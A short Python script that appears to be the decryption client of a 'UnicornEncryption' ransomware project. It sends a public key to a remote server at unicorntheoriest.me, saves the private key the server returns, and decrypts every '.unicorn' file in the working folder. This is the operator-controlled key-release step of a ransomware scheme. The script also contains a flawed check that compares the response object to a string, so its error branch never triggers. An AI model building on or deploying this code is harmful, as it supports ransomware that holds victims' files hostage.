import requests
import json
import os
import constant
import decrypt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

URL = 'https://unicorntheoriest.me:23245/server'
f=open(constant.PUBLIC_PEM, 'rb')
public_key = serialization.load_pem_public_key(
    f.read(),
    backend=default_backend()
)
pum = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
customHeader = {'Appkey': 'UnicornEncryption'}
getRequest = requests.get(URL, params = {'public_key': pum}, headers=customHeader)
if (getRequest != "Invalid Application"):
    data = json.loads(getRequest.text)
    f.close()
    f=open(constant.PRIVATE_PEM, 'w')
    f.write(data['private_key'])
    f.close()

    file_List = os.listdir()
    for x in file_List:
        if x.endswith('.unicorn'):
            decrypt.MyfileDecryptMAC("./" + x)
else:
    print("Something wrong with the get application")
